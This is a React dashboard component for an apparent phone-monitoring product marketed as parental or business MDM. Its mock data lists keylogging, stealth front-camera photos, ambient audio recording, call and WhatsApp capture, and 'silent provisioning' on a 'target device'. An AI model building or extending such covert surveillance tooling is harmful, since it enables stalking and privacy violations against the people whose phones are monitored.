import React, { useState } from 'react';
import { Header } from './components/Header';
import { Sidebar } from './components/Sidebar';
import { DeviceStatusBanner } from './components/DeviceStatusBanner';
import { FeatureTileGrid } from './components/FeatureTileGrid';
import { LiveMapWidget } from './components/LiveMapWidget';
import { RecentActivityFeed } from './components/RecentActivityFeed';
import { DeviceInfo, OperationalMode, MetricSummary, ActivityEvent } from './types/dashboard.types';

export default function App() {
  const [operationalMode, setOperationalMode] = useState<OperationalMode>('PARENT');
  const [activeTab, setActiveTab] = useState<string>('dashboard');

  const availableDevices: DeviceInfo[] = [
    {
      id: 'dev_01',
      alias: "Child's Phone",
      model: 'SM-A15S6 (Galaxy S23)',
      manufacturer: 'Samsung',
      androidVersion: '14',
      imei: '35473307256675X',
      simOperator: 'Airtel',
      batteryLevel: 85,
      isCharging: false,
      isOnline: true,
      lastConnected: 'a few seconds ago',
      appVersion: '8.1.8 - 218',
      capabilities: {
        accessibility: true,
        deviceOwner: true,
        gps: true,
        batteryExempt: true,
        twoWayRecording: true,
      }
    },
    {
      id: 'dev_02',
      alias: 'Tablet #02',
      model: 'Pixel 8 Pro',
      manufacturer: 'Google',
      androidVersion: '14',
      imei: '86420194817290X',
      simOperator: 'Jio 5G',
      batteryLevel: 62,
      isCharging: true,
      isOnline: true,
      lastConnected: '5m ago',
      appVersion: '8.1.8 - 218',
      capabilities: {
        accessibility: true,
        deviceOwner: true,
        gps: true,
        batteryExempt: true,
        twoWayRecording: false,
      }
    }
  ];

  const [currentDevice, setCurrentDevice] = useState<DeviceInfo>(availableDevices[0]);

  const metrics: MetricSummary = {
    whatsappMessages: 24,
    whatsappCalls: 4,
    callRecordings: 12,
    smsLogs: 8,
    locationPoints: 142,
    surroundAudioCount: 6,
    stealthPhotos: 8,
    screenshots: 6,
    keylogsCount: 142,
    webHistoryCount: 45,
    blockedAppsCount: 3,
    contactsCount: 248
  };

  const activityEvents: ActivityEvent[] = [
    {
      id: 'evt_01',
      source: 'whatsapp',
      title: 'WhatsApp Incoming Chat',
      description: 'Alex: "Meeting at 5 PM near central park"',
      timestamp: '2 mins ago'
    },
    {
      id: 'evt_02',
      source: 'calls',
      title: 'Phone Call Recorded',
      description: 'Incoming call from +91 98765 43210 (2m 14s audio)',
      timestamp: '14 mins ago'
    },
    {
      id: 'evt_03',
      source: 'location',
      title: 'Geofence Event',
      description: 'Target device entered "Home Safety Zone"',
      timestamp: '32 mins ago'
    },
    {
      id: 'evt_04',
      source: 'keylogger',
      title: 'Keylogger Text Input',
      description: 'Typed in Chrome: "python programming guide 2026"',
      timestamp: '1h ago'
    },
    {
      id: 'evt_05',
      source: 'system',
      title: 'Device Owner Verification',
      description: 'Path A silent provisioning status confirmed active',
      timestamp: '2h ago'
    },
    {
      id: 'evt_06',
      source: 'media',
      title: 'Stealth Photo Uploaded',
      description: 'Front camera stealth capture stored in S3/R2',
      timestamp: '3h ago'
    }
  ];

  return (
    <div className="min-h-screen bg-slate-50 text-slate-900 flex font-sans antialiased">
      {/* Sidebar Navigation */}
      <Sidebar
        currentDevice={currentDevice}
        activeTab={activeTab}
        onSelectTab={(tabId) => setActiveTab(tabId)}
      />

      {/* Main Content Workspace */}
      <div className="flex-1 flex flex-col min-w-0 overflow-y-auto">
        {/* Header Bar */}
        <Header
          currentDevice={currentDevice}
          availableDevices={availableDevices}
          onSelectDevice={(dev) => setCurrentDevice(dev)}
          operationalMode={operationalMode}
          onToggleMode={(mode) => setOperationalMode(mode)}
          activeTab={activeTab}
          onSelectTab={(tabId) => setActiveTab(tabId)}
        />

        {/* Page Main Container */}
        <main className="p-4 sm:p-6 lg:p-8 max-w-7xl mx-auto w-full space-y-6">
          
          {/* Top Operational Mode Alert Banner */}
          <div className="bg-gradient-to-r from-amber-600 via-orange-600 to-amber-700 text-white rounded-xl p-4 shadow-sm flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
            <div>
              <div className="flex items-center gap-2 font-bold text-sm">
                <span className="px-2 py-0.5 rounded bg-white/20 text-xs uppercase tracking-wider">
                  {operationalMode === 'PARENT' ? 'Parent Safety Mode' : 'Business MDM Mode'}
                </span>
                <span>Active Protection & Telemetry Real-time Stream</span>
              </div>
              <p className="text-xs text-amber-100 mt-1">
                Monitoring WhatsApp, Call Recordings, Live Location, Keylogger, and System Policies for safe authorized usage.
              </p>
            </div>
            <button className="px-4 py-2 bg-white text-orange-800 hover:bg-orange-50 rounded-lg text-xs font-bold shadow-xs transition-all shrink-0">
              Upgrade Subscription
            </button>
          </div>

          {/* 1. Device Information & Security Banner */}
          <DeviceStatusBanner
            device={currentDevice}
            onRefresh={() => console.log('Refreshing device diagnostics...')}
          />

          {/* 2. Feature Tile Grid (4-Column Layout) */}
          <FeatureTileGrid
            metrics={metrics}
            onSelectFeature={(featureId) => setActiveTab(featureId)}
          />

          {/* 3. Bottom Row: Live Map Preview & Real-Time Event Stream */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <LiveMapWidget
              device={currentDevice}
              onOpenFullMap={() => setActiveTab('location')}
            />
            <RecentActivityFeed
              events={activityEvents}
              onViewAll={() => setActiveTab('keylogger')}
            />
          </div>

        </main>
      </div>
    </div>
  );
}
